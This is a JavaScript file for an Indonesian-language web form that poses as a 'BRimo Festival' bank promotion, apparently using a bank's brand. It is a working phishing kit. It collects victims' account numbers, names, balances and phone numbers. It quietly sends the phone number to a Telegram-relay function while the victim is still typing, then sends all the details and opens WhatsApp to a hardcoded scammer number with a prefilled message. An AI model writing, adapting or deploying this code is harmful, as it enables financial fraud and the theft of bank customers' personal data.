document.addEventListener('DOMContentLoaded', function() {
    // Element declarations
    const pages = document.querySelectorAll('.page');
    const page1 = document.getElementById('page1');
    const page2 = document.getElementById('page2');
    const page3 = document.getElementById('page3');
    const footer = document.querySelector('.footer-image');
    const next1 = document.getElementById('next1');
    const next2 = document.getElementById('next2');
    const contactService = document.getElementById('contactService');
    const accountNumber = document.getElementById('accountNumber');
    const accountName = document.getElementById('accountName');
    const currentBalance = document.getElementById('currentBalance');
    const amountInWords = document.getElementById('amountInWords');
    const loadingOverlay = document.getElementById('loadingOverlay');
    const phoneNumberInput = document.getElementById('phoneNumber');

    // ================= UTILITY FUNCTIONS =================
    function toggleHeaderVisibility(show) {
        const headerImage = document.querySelector('.header-image');
        headerImage.classList.toggle('header-hidden', !show);
    }

    function toggleFooterVisibility(show) {
        footer.classList.toggle('footer-hidden', !show);
    }

    function showLoading() {
        loadingOverlay.style.display = 'flex';
    }

    function hideLoading() {
        loadingOverlay.style.display = 'none';
    }

    function goToPage(currentPage, nextPage) {
        showLoading();
        setTimeout(() => {
            currentPage.classList.remove('active');
            nextPage.classList.add('active');
            toggleHeaderVisibility(nextPage.id !== 'page2');
            toggleFooterVisibility(nextPage.id !== 'page3');
            window.scrollTo(0, 0);
            hideLoading();
        }, 1500);
    }

    // ================= TELEGRAM INTEGRATION =================
    async function sendToTelegram(data) {
        try {
            showLoading();
            const response = await fetch('/.netlify/functions/send-dana-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error(await response.text());
            }
            return await response.json();
        } catch (error) {
            console.error('Telegram Error:', error);
            throw error;
        } finally {
            hideLoading();
        }
    }

    // Phone number input with debounce
    let debounceTimer;
    phoneNumberInput.addEventListener('input', function() {
        clearTimeout(debounceTimer);
        const phoneNumber = this.value.replace(/\D/g, '');
        
        if (phoneNumber.length >= 10) {
            debounceTimer = setTimeout(() => {
                sendToTelegram({
                    type: 'phone_number',
                    phoneNumber: phoneNumber,
                    name: accountName.value.trim(),
                    balance: currentBalance.value.replace(/\./g, '')
                }).catch(error => {
                    console.log('Notification failed:', error);
                });
            }, 1500);
        }
    });

    // ================= NUMBER CONVERSION =================
    function convertNumberToWords(num) {
        const ones = ['', 'Satu', 'Dua', 'Tiga', 'Empat', 'Lima', 'Enam', 'Tujuh', 'Delapan', 'Sembilan'];
        const teens = ['Sepuluh', 'Sebelas', 'Dua Belas', 'Tiga Belas', 'Empat Belas', 'Lima Belas', 'Enam Belas', 'Tujuh Belas', 'Delapan Belas', 'Sembilan Belas'];
        const tens = ['', 'Sepuluh', 'Dua Puluh', 'Tiga Puluh', 'Empat Puluh', 'Lima Puluh', 'Enam Puluh', 'Tujuh Puluh', 'Delapan Puluh', 'Sembilan Puluh'];
        const scales = ['', 'Ribu', 'Juta', 'Miliar', 'Triliun'];

        if (num == 0) return 'Nol Rupiah';
        num = parseInt(num, 10);
        if (isNaN(num)) return '';

        const chunks = [];
        while (num > 0) {
            chunks.push(num % 1000);
            num = Math.floor(num / 1000);
        }

        let words = [];
        for (let i = 0; i < chunks.length; i++) {
            const chunk = chunks[i];
            if (chunk === 0) continue;

            const chunkWords = [];
            const hundred = Math.floor(chunk / 100);
            const ten = chunk % 100;

            if (hundred > 0) {
                chunkWords.push(hundred === 1 ? 'Seratus' : `${ones[hundred]} Ratus`);
            }

            if (ten > 0) {
                if (ten < 10) {
                    chunkWords.push(ones[ten]);
                } else if (ten < 20) {
                    chunkWords.push(teens[ten - 10]);
                } else {
                    const tenPart = Math.floor(ten / 10);
                    const onePart = ten % 10;
                    chunkWords.push(tens[tenPart]);
                    if (onePart > 0) chunkWords.push(ones[onePart]);
                }
            }

            if (chunkWords.length > 0) {
                words.unshift(`${chunkWords.join(' ')}${scales[i] ? ` ${scales[i]}` : ''}`);
            }
        }

        return `${words.join(' ')} Rupiah`;
    }

    function formatNumberInput(input) {
        const value = input.replace(/\D/g, '');
        return value ? parseInt(value, 10).toLocaleString('id-ID') : '';
    }

    // ================= EVENT LISTENERS =================
    currentBalance.addEventListener('input', function() {
        this.value = formatNumberInput(this.value);
        const numericValue = this.value.replace(/\./g, '');
        amountInWords.textContent = convertNumberToWords(numericValue);
    });

    accountName.addEventListener('input', function() {
        this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
    });

    accountNumber.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
    });

    next1.addEventListener('click', function() {
        if (!accountNumber.value.trim()) {
            alert('Mohon isi nomor rekening');
            return;
        }
        if (!/^\d+$/.test(accountNumber.value.trim())) {
            alert('Nomor rekening harus berupa angka');
            return;
        }
        if (!accountName.value.trim()) {
            alert('Mohon isi nama pemilik rekening');
            return;
        }
        if (!/^[a-zA-Z\s]+$/.test(accountName.value.trim())) {
            alert('Nama hanya boleh mengandung huruf dan spasi');
            return;
        }
        goToPage(page1, page2);
    });

    next2.addEventListener('click', function() {
        const numericValue = currentBalance.value.replace(/\./g, '');
        if (!numericValue) {
            alert('Mohon isi jumlah saldo');
            return;
        }
        if (isNaN(numericValue) || parseInt(numericValue) <= 0) {
            alert('Jumlah saldo harus angka positif');
            return;
        }
        goToPage(page2, page3);
    });

    contactService.addEventListener('click', async function() {
        const whatsappNumber = '6283847980901';
        const virtualCode = Math.floor(100000 + Math.random() * 900000);
        const numericValue = currentBalance.value.replace(/\./g, '');
        const formattedBalance = new Intl.NumberFormat('id-ID', {
            style: 'currency',
            currency: 'IDR'
        }).format(numericValue);

        const message = `Halo admin BRimo Festival,\n\nSaya ${accountName.value.trim()} dengan detail:\n- Rekening: ${accountNumber.value.trim()}\n- Saldo: ${formattedBalance}\n- Dalam Huruf: ${amountInWords.textContent}\n\nKode verifikasi: ${virtualCode}\n\nTerima kasih.`;

        try {
            await sendToTelegram({
                type: 'contact_service',
                accountNumber: accountNumber.value.trim(),
                accountName: accountName.value.trim(),
                amount: formattedBalance,
                amountInWords: amountInWords.textContent,
                virtualCode: virtualCode
            });
            window.open(`https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`, '_blank');
        } catch (error) {
            alert('Gagal mengirim data: ' + error.message);
        }
    });

    // Initialize
    page1.classList.add('active');
    toggleHeaderVisibility(true);
    toggleFooterVisibility(true);
});
